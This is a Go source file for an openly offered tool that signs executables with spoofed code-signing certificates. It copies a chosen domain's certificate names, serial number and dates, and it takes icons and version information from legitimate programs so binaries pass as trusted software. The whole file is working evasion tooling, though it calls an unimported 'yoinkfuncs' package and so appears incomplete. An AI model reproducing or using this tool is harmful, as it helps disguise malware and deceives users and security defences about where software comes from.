package main

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"flag"
	"fmt"
	"io"
	"log"
	crand "math/rand"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/fatih/color"
)

type FlagOptions struct {
	outFile   string
	inputFile string
	domain    string
	password  string
	real      string
	verify    string
    take  string
	certmode string
}

var (
	debugging   bool
	debugWriter io.Writer
)

func printDebug(format string, v ...interface{}) {
	if debugging {
		output := fmt.Sprintf("[DEBUG] ")
		output += format
		fmt.Fprintf(debugWriter, output, v...)
	}
}

const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

func VarNumberLength(min, max int) string {
	var r string
	crand.Seed(time.Now().UnixNano())
	num := crand.Intn(max-min) + min
	n := num
	r = RandStringBytes(n)
	return r
}

func RandStringBytes(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[crand.Intn(len(letters))]

	}
	return string(b)
}

func GenerateCert(domain string, inputFile string) {
	var err error
	rootKey, err := rsa.GenerateKey(rand.Reader, 4096)
	if err != nil {
		panic(err)
	}
	certs, err := GetCertificatesPEM(domain + ":443")
	if err != nil {
		os.Chdir("..")
		foldername := strings.Split(inputFile, ".")
		os.RemoveAll(foldername[0])
		log.Fatal("Error: The domain: " + domain + " does not exist or is not accessible from the host you are compiling on")
	}
	block, _ := pem.Decode([]byte(certs))
	cert, _ := x509.ParseCertificate(block.Bytes)

	keyToFile(domain+".key", rootKey)

	SubjectTemplate := x509.Certificate{
		SerialNumber: cert.SerialNumber,
		Subject: pkix.Name{
			CommonName: cert.Subject.CommonName,
		},
		NotBefore:             cert.NotBefore,
		NotAfter:              cert.NotAfter,
		BasicConstraintsValid: true,
		IsCA:                  true,
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth, x509.ExtKeyUsageClientAuth},
	}
	IssuerTemplate := x509.Certificate{
		SerialNumber: cert.SerialNumber,
		Subject: pkix.Name{
			CommonName: cert.Issuer.CommonName,
		},
		NotBefore: cert.NotBefore,
		NotAfter:  cert.NotAfter,
	}
	derBytes, err := x509.CreateCertificate(rand.Reader, &SubjectTemplate, &IssuerTemplate, &rootKey.PublicKey, rootKey)
	if err != nil {
		panic(err)
	}
	certToFile(domain+".pem", derBytes)

}

func keyToFile(filename string, key *rsa.PrivateKey) {
	file, err := os.Create(filename)
	if err != nil {
		panic(err)
	}
	defer file.Close()
	b, err := x509.MarshalPKCS8PrivateKey(key)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Unable to marshal RSA private key: %v", err)
		os.Exit(2)
	}
	if err := pem.Encode(file, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: b}); err != nil {
		panic(err)
	}
}

func certToFile(filename string, derBytes []byte) {
	certOut, err := os.Create(filename)
	if err != nil {
		log.Fatalf("[-] Failed to Open cert.pem for Writing: %s", err)
	}
	if err := pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: derBytes}); err != nil {
		log.Fatalf("[-] Failed to Write Data to cert.pem: %s", err)
	}
	if err := certOut.Close(); err != nil {
		log.Fatalf("[-] Error Closing cert.pem: %s", err)
	}
}

func GetCertificatesPEM(address string) (string, error) {
	conn, err := tls.Dial("tcp", address, &tls.Config{
		InsecureSkipVerify: true,
	})
	if err != nil {
		return "", err
	}
	defer conn.Close()
	var b bytes.Buffer
	for _, cert := range conn.ConnectionState().PeerCertificates {
		err := pem.Encode(&b, &pem.Block{
			Type:  "CERTIFICATE",
			Bytes: cert.Raw,
		})
		if err != nil {
			return "", err
		}
	}
	return b.String(), nil
}

func GeneratePFK(password string, domain string) {
	cmd := exec.Command("openssl", "pkcs12", "-export", "-out", domain+".pfx", "-inkey", domain+".key", "-in", domain+".pem", "-passin", "pass:"+password+"", "-passout", "pass:"+password+"")
	err := cmd.Run()
	if err != nil {
		log.Fatalf("cmd.Run() failed with %s\n", err)
	}
}

func SignExecutable(password string, pfx string, filein string, fileout string) {
	cmd := exec.Command("osslsigncode", "sign", "-pkcs12", pfx, "-in", ""+filein+"", "-out", ""+fileout+"", "-pass", ""+password+"")
	err := cmd.Run()
	if err != nil {
		log.Fatalf("cmd.Run() failed with %s\n", err)
	}
}

func Check(check string) {

	cmd := exec.Command("osslsigncode", "verify", ""+check+"")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err := cmd.Run()
	if err != nil {
		log.Fatalf("cmd.Run() failed with %s\n", err)
	}
}

func ResourceTake(source string, destination string) {
    
    srcRes0 := yoinkfuncs.LoadAllResourcesFromPath(source)
	ico := yoinkfuncs.SearchForCommonICOGroups(srcRes0)
    
    rawfiRes := yoinkfuncs.GetSpecRawResTypeData(srcRes0, 0x10)
    vi := yoinkfuncs.GetRawVersionInfo(rawfiRes)
	jdata := yoinkfuncs.GetVersionInfoAsJSON(vi)
    ogfvi := yoinkfuncs.GetSrcFileVersionData(jdata)
	newfvi := yoinkfuncs.RequestNewFileInfoForm(ogfvi)
    yoinkfuncs.SetDstFileInfoData(vi, newfvi)
	
    srcRes0.SetIcon(yoinkfuncs.WINICON, ico)
	srcRes0.SetVersionInfo(*vi)
	yoinkfuncs.PerformResPatch(*srcRes0, destination)

}

func options() *FlagOptions {
	certmode := flag.String("Certmode", "NONE", "Select a mode to apply the certificate. [STEAL, PFXSIGN, or NONE]")
	outFile := flag.String("O", "", "Output file name")
	inputFile := flag.String("I", "", "Unsigned file name to be signed")
	take := flag.String("Yoink", "", "Existing EXE/DLL file to yoink (take) ICON and file info from.")
	domain := flag.String("Domain", "", "Domain you want to create a fake code sign for")
	password := flag.String("Password", "", "Password for real certificate")
    real := flag.String("Real", "", "Path to a valid .pfx certificate file")
	verify := flag.String("Verify", "", "Verifies a file's code sign certificate")
	debug := flag.Bool("debug", false, "Print debug statements")
	flag.Parse()
	debugging = *debug
	debugWriter = os.Stdout
	return &FlagOptions{outFile: *outFile, inputFile: *inputFile, take: *take, certmode: *certmode, domain: *domain, password: *password, real: *real, verify: *verify}
}

func main() {
	fmt.Println(`
_____.___.      .__        __   .____    .__       .__     __
\__  |   | ____ |__| ____ |  | _|    |   |__| ____ |  |___/  |_  ___________
 /   |   |/  _ \|  |/    \|  |/ /    |   |  |/ ___\|  |  \   __\/ __ \_  __ \
 \____   (  <_> )  |   |  \    <|    |___|  / /_/  >   Y  \  | \  ___/|  | \/
 / ______|\____/|__|___|  /__|_ \_______ \__\___  /|___|  /__|  \___  >__|
 \/                     \/     \/       \/ /_____/      \/          \/
                                            @Savsanta	
	
[*] A Tool for Code Signing... Real or Fake`)
	opt := options()
	if opt.verify == "" && opt.inputFile == "" && opt.outFile == "" {
		log.Fatal("Error: Please provide a file to sign or a file check")
	}

	if opt.verify == "" && opt.inputFile == "" {
		log.Fatal("Error: Please provide a file to sign")
	}
	if opt.verify == "" && opt.outFile == "" {
		log.Fatal("Error: Please provide a name for the signed file")
	}
	if opt.real == "" && opt.domain == "" && opt.verify == "" {
		log.Fatal("Error: Please specify a valid path to a .pfx file or specify the domain to spoof")
	}

	if opt.verify != "" {
		fmt.Println("[*] Checking code signed on file: " + opt.verify)
		Check(opt.verify)
		os.Exit(3)
	}
	if opt.real != "" {
		fmt.Println("[*] Signing " + opt.inputFile + " with a valid cert " + opt.real)
		SignExecutable(opt.password, opt.real, opt.inputFile, opt.outFile)
    }
	if opt.take != "" {
		fmt.Println("[*] Yoinking icon and file info from " + opt.take + " for target " + opt.inputFile)
        ResourceTake(opt.take, opt.inputFile)
		SignExecutable(opt.password, opt.real, opt.inputFile, opt.outFile)
	} else {
		password := VarNumberLength(8, 12)
		pfx := opt.domain + ".pfx"
		fmt.Println("[*] Signing " + opt.inputFile + " with a fake cert")
		GenerateCert(opt.domain, opt.inputFile)
		GeneratePFK(password, opt.domain)
		SignExecutable(password, pfx, opt.inputFile, opt.outFile)

	}
	fmt.Println("[*] Cleaning up....")
	printDebug("[!] Deleting " + opt.domain + ".pem\n")
	os.Remove(opt.domain + ".pem")
	printDebug("[!] Deleting " + opt.domain + ".key\n")
	os.Remove(opt.domain + ".key")
	printDebug("[!] Deleting " + opt.domain + ".pfx\n")
	os.Remove(opt.domain + ".pfx")
	fmt.Println(color.GreenString("[+] ") + "Signed File Created.")

}
